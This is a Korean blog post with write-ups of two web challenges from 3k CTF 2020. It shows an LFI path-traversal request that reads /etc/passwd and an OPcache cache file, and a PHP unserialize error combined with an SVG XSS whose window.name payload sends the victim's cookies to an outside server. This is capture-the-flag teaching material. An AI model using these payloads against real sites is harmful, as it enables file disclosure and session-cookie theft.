---
layout: post
date: 2020-07-26 00:00:11
title: "3k CTF 2020 Write Up"
categories: CTF
tags: [XSS, LFI]
author:
  - Jeongwon Jo

---
## (Web) carthagods [496 pts]

> carthagods 문제는 opcache 엔진에서 발생하는 취약점을 이용해서 FLAG 파일을 릭 하는 문제입니다.

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FUjhnb%2FbtqF0QEIvAL%2FuvEXi0CpxfkTSUsCQtkvf0%2Fimg.png)

문제로 들어와 보니 6가지 카테고리 가 있는 것을 볼 수 있습니다. 일단 제일 먼저 눈에 띄는 건 `FLAG`라는 카테고리 입니다.

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FHFT8O%2FbtqF15tIUIO%2FYe9KcFOCVstLCRu8vCxEj0%2Fimg.png)

`FLAG` 카테고리로 들어와 보니 `flag.php`로 요청을 하는데 유튜브 영상만 보이는 것을 볼 수 있습니다. 소스 코드를 봐도 필요한 것들이 보이진 않아서 `phpinfo`를 확인해 보기로 했습니다.

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fu3mBf%2FbtqF3F8UoSj%2FQyJ9Qt4UWSq3LYC9vdV1s0%2Fimg.png)

`phpinfo` 카테고리로 들어와 보니 php 버전이 `7.2~`인 것을 볼 수 있습니다. 저번에 제가 CVE 취약점들을 둘러보다가 `php 7.2.24`에서 터지는 취약점을 한 번 본 적이 있는데 해당 취약점은 php 7.3.11과 7.2.24에서 RCE가 터지는 취약점 `CVE 2019-11043`였습니다. 하지만 이번 문제는 이를 이용해서는 풀 수 없을 거 같아 좋다 말았는데 2시간정도 `phpinfo`의 값을 기준으로 구글링을 하다가 `OPcache`란 것을 알게 되었습니다.  

`OPcache`는  `PHP 7.0`에 내장된 새로운 캐시 엔진이라고 합니다. 이 엔진은 php 코드를 `컴파일`하여 나온 결과를 `바이트 코드 형태로 메모리에 저장`해줍니다.

또 php.ini 설정 파일 내에 `캐시 정보의 해당 폴더`를 지정해준다고 합니다. 즉, 파일이 저장될 경로가 정해지는 것 입니다. 그럼 캐시 정보의 해당 폴더가 `/admin/`이라고 가정하에 `flag.php` 파일을 저장한다고 해봅시다.

제일 먼저 `flag.php` 파일이 `OPcache`에 의해 컴파일되어 그 결과를 `바이트 코드 형태로 메모리에 저장`을 할 것인데 저장은 `/admin/[system_id]/flag.php.bin`와 같이 이렇게 저장이 될 것입니다. 경로 뒤에는 `system_id`가 붙은 후에 뒤에 파일이 붙는 거 같습니다.

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FDxsFr%2FbtqF1AVeB5A%2FjjPw9Nilk6wZQGDgd1GxrK%2Fimg.png)

혹시나 이 취약점을 이용해서 풀 수 있을 거 같아서 `phpinfo`에서 `opcache`를 검색해 보니 `file_cache`를 사용하는 것을 볼 수 있습니다. 보면 해당 폴더가 `/var/www/cache/`로 되어 있는 것을 볼 수 있습니다. 그러니 만약에 flag.php라는 파일을 저장한다고 하면 OPcache에 의해 컴파일된 후에 `/var/www/cache/[system_id]/flag.php.bin`으로 저장이 될 것입니다.

생각해 보면 `flag.php`라는 파일이 실제로 존재하고 해당 파일이 `/var/www/cache/[system_id]/flag.php.bin`에 저장되어 있다고 생각 들어 이 시나리오를 이용해 해결하기로 했습니다.

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FBCg5P%2FbtqF1CepJ02%2FLN0FckJWxn1Sdi6nusjAF1%2Fimg.png)

하지만 `system_id`를 구하는 방법을 몰라 구글링을 해보았는데, `system_id`를 찾아주는 코드가 `Gitbub`에 올라와 있는 것을 발견했습니다.

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FeOj3lN%2FbtqF3b1ibhx%2FIPFpmRkCQenTc7oXDSaYbK%2Fimg.png)

해당 문제 `phpinfo` 파일 소스 코드를 복사해 info.html로 만들어 준 후에 코드를 돌려보니 `system Id`를 찾아주는 것을 볼 수 있었습니다.

이제 `flag.php` 파일이 `/var/www/cache/e2c6579e4df1d9e77e36d2f4ff8c92b3/var/www/html/flag.php.bin`에 저장되어 있는 것을 알게 되었습니다. 그런데 해당 경로로 접근하려면 `LFI`가 터지는 곳을 찾아야 하니 찾아보았습니다.

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2F045Wy%2FbtqF3cy7QQC%2FUKVTYm12XzJkAP4ndxu4B0%2Fimg.png)

문제에서 소스 코드를 보니 일단 `js` 코드들이 많이 있었습니다. 하나 하나 다 접속해보니 `path traversal`이 터질 거 같은 부분은 나오지 않았습니다. 그러다가 마지막에 `/js/main.js` 부분에서 상위로 올라가 /js로 접근을 해보니 이상한 것을 발견했습니다.

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2F4K7Ds%2FbtqF3csnyxG%2Fjpp2di3Rc8fFnGIeEo8zw1%2Fimg.png)

분명 `/js`로 접근을 했는데 `?eba1b61134bf5818771b8c3203a16dc9=js` 이렇게 Parameter가 js로 접근을 해주고 있었습니다. 뭔가 저 파라미터를 이용해서 `LFI`가 터질 거 같았습니다. 그래서 `LFI` 취약점의 유무를 확인하기 위해  `/etc/passwd`로 접근을 해보았습니다.

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FKqV2C%2FbtqF1oAIjo1%2FJcbZGWoNFwcUQSkHhh2OlK%2Fimg.png)

처음에는 `http://carthagods.3k.ctf.to:8039/js/?eba1b61134bf5818771b8c3203a16dc9=../../../../../etc/passwd` 이렇게 요청을 보내주었는데 계속 `403` 에러가 발생했습니다. 그래서 그냥 경로 없이 `http://carthagods.3k.ctf.to:8039/?eba1b61134bf5818771b8c3203a16dc9=../../../../../etc/passwd` 이렇게 바로 보내주니 `LFI`가 잘 터지는 것을 볼 수 있었습니다. 

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbF0Dvp%2FbtqF1RWL5xt%2FZVfG3qz4EjnesJIRUgOVD1%2Fimg.png)

그래서 바로 `flag.php`가 저장되어 있는 경로`http://carthagods.3k.ctf.to:8039/eba1b61134bf5818771b8c3203a16dc9=../../../../../../../var/www/cache/e2c6579e4df1d9e77e36d2f4ff8c92b3/var/www/html/flag.php.bin`로 접근을 해주니 `flag.php.bin` 파일이 출력되는 것을 볼 수 있었습니다. 이번 문제를 풀면서 `opcache` 엔진에 대해 알아가 매우 좋은 문제였다고 개인적으로 생각합니다.

> FLAG : 3k{Hail_the3000_years_7hat_are_b3h1nd}

---
## (Web) XSSER [499 pts]

> XSSER 챌린지는 php object injection 취약점을 이용해서 XSS를 트리거하고, window.name을 이용해 길이 제한을 우회해 XSS를 이용해서 쿠키를 탈취하는 문제 입니다.

```php
<?php
include('flag.php');
class User

{
    public $name;
    public $isAdmin;
    public function __construct($nam)
    {
        $this->name = $nam;
        $this->isAdmin=False;
    }
}

ob_start();
if(!(isset($_GET['login']))){
    $use=new User('guest');
    $log=serialize($use);
    header("Location: ?login=$log");
    exit();

}

$new_name=$_GET['new'];
if (isset($new_name)){


  if(stripos($new_name, 'script'))//no xss :p 
                 { 
                    $new_name = htmlentities($new_name);
                 }
        $new_name = substr($new_name, 0, 32);
  echo '<h1 style="text-align:center">Error! Your msg '.$new_name.'</h1><br>';
  echo '<h1>Contact admin /req.php </h1>';

}
 if($_SERVER['REMOTE_ADDR'] == '127.0.0.1'){
            setcookie("session", $flag, time() + 3600);
        }
$check=unserialize(substr($_GET['login'],0,56));
if ($check->isAdmin){
    echo 'welcome back admin ';
}
ob_end_clean();
show_source(__FILE__);
```

만약에 `login`의 값이 존재하지 않으면 생성자 함수를 통해 생성하고 `Location`을 해줍니다. 그래서 문제로 들어오게 되면 바로 `?login=`으로 Location이 되는 거 같습니다. 그러니 이 부분에서 에러 발생을 유발해야 다음 동작들을 실행 할 수 있습니다. 에러가 나지 않으면 `new`의 값을 받고, `new`의 값로 xss를 터트릴 수 있는데 이 부분이 실행이 되지 않고 바로 리다이렉션이 되는 것 입니다. 첫 번째 목표는 저기에서 에러를 발생시키면 될 거 같습니다.

그리고 위에서 말했지만 밑에 보면 `new`라는 파라미터의 값이 돔으로 바로 들어가는 것을 볼 수 있습니다. 또한 `new`의 값이 `new_name`으로 들어가 검증을 하게 됩니다. 이때 `script`라는 문자가 있으면 참이 되어 `htmlentitle(`) 함수로 엔티티로 변환하기 때문에 `XSS`가 터지지 않습니다. 즉, `<script>`, `javascript:`와 같은 것들은 못 쓰게 됩니다. 그러므로 `<img>`, `<svg>`와 같은 태그를 이용해서 스크립트를 짜서 XSS를 터트리면 될 거 같습니다.

또 밑에 보면 `REMOTE_ADDR`이 127.0.0.1이면 `Cookie`에 `FLAG`를 추가해주는 것을 볼 수 있습니다. 이 부분은 어드민 봇으로 보내주게 되면 알아서 처리 됩니다.

![](https://github.com/wjddnjs33/image/blob/main/pbCTF%202020/a.png?raw=true)

그런데 일단 `Login` 하는 부분에서 에러를 발생해야 `XSS`를 터트려 쿠키를 탈취하던지 할 수 있습니다. 그래서 `serialize()`, `unserialize()`에 대해서 여러 가지를 검색을 해보았습니다. 그러다 직렬화된 문자열에 인스턴스화를 할 수 없게 하는 Class가 있는데, 역직렬화 할 때 해당 Class를 참조하게 되면 PHP가 에러를 내뱉는다고 합니다.

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FSKjGz%2FbtqF1Btn0Ev%2FL0UO8SwZFdPphU1JLl7dMk%2Fimg.png)

저 참고 자료 속 내용에 `(e.g. being abstract)`라는 구문이 있어 뭔가 `abstract`와 관련이 있을 거 같아 또 abstract에 대해 죽도록 구글링을 해보니 직렬화된 데이터로 `Traversable`라는 클래스를 `empty`로 넘겨주면 에러를 발생한다고 합니다.

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FcUdR6S%2FbtqF3SAvkiZ%2FCn0nU7qHiwhCWf1EZoC4mk%2Fimg.png)

```php
$check=unserialize(substr($_GET['login'],0,56));
```
그래서 `http://xsser.3k.ctf.to/?login=O:11:"Traversable":0:{}` 이렇게 요청을 보내주니 역직렬화 하는 부분에서 에러가 발생해 리다이렉션이 되지 않은 것을 볼 수 있습니다 :)

```php
    $new_name = $_GET['new'];
    if (isset($new_name)){
        if(stripos($new_name, 'script')) {
            $new_name = htmlentities($new_name);
        }
        $new_name = substr($new_name);
        echo '<h1 style="text-align:center">Error! Your msg '.$new_name.'</h1><br>';
        echo '<h1>Contact admin /req.php </h1>';
    }
```
이제 Location 부분은 에러를 발생해서 리다이렉션이 일어나지 않을 것이고, `new` 파라미터를 보내주게 되면 위에 있는 코드 부분이 실행이 될 것입니다. 윗 부분에서도 한 번 이야기를 했지만 `script`라는 문자열이 들어간 `Tag`, `Attribute`는 사용하지 못합니다.

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FchvPQn%2FbtqF1B1dV2L%2FwyGz6Ypl4FmkVgh8S8g540%2Fimg.png)

`script` Tag는 사용하지 못하므로 `svg` Tag를 사용해서 `xss`를 트리거 해보니 잘 되는 것을 확인 할 수 있었습니다.

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fn0LuU%2FbtqF2RCjUjC%2FsiwW2R3zm9HM0OPvuDyjS0%2Fimg.png)

팝업 창을 닫아 보니 `Contact admin /req.php`라는 문구가 떴습니다. 아마 `/req.php`가 `Admin Bot`이고 여길 통해 XSS를 해 쿠키를 탈취를 해야 하는 거 같습니다.

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FdM1n0b%2FbtqF14WbTVh%2FQeyb3vKTTNeUkMqlYvjcg0%2Fimg.png)

`/req.php`로 들어와 보니 `Name`, `Url`, `Message`를 입력해 Admin Bot으로 요청을 보낼 수 있습니다. 그런데 생각해보면 `new` 파라미터의 값의 길이는 32자로 제한이 있어 document.location을 이용해 내 서버로 쿠키를 탈취 할 수는 없었습니다. 여기서 막혀 잠을 자고 일어나 다시 구글링을 시작해보았는데 `window.name`을 이용해서 xss를 하는 것을 보았습니다.

```html
<script>
    window.name = "document.location = `http://141.164.55.161:8080/info.php?data=` + document.cookie";
    window.location = "http://127.0.0.1/?login=?login=O:11:%22Traversable%22:0:{}&new=<svg/onliad=eval(name)?>";
</script>
```
`window.name`을 이용해 위와 같이 페이로드를 작성해주었습니다.

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FcjKZw3%2FbtqF1R3Rj1N%2FHb6WOZDU2bFMqO0Djo4K40%2Fimg.png)

/req.php에서 `Url`을 입력하는 곳에 `제 서버 URL`을 입력해 전송을 해보니 스크립트가 잘 실행이 되어 `flag.txt`가 생긴 것을 볼 수 있었고, 그 값으로 FALG가 들어 있는 것을 볼 수 있었습니다.

> FLAG : 3k{3asy_XsS_&_pHp_Ftw}

---
